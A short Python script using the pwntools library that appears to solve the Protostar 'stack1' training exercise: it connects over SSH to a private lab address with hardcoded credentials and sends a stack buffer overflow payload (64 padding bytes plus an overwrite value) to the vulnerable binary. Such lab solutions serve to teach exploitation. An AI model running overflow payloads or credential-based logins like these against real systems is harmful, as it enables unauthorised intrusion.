from pwn import *

IP   = '192.168.43.18'
USER = 'user'
PASS = 'user'
PORT = 22


shell = ssh(user=USER,host=IP,port=PORT, password=PASS)
sh = shell.run('/bin/sh')
payload = "A"*64 + "\x64\x63\x62\x61"
sh.sendline(f'/opt/protostar/bin/stack1 {payload}')
log.info('sending payload..')

sh.sendline(payload)
log.success(sh.recvline())
shell.close()

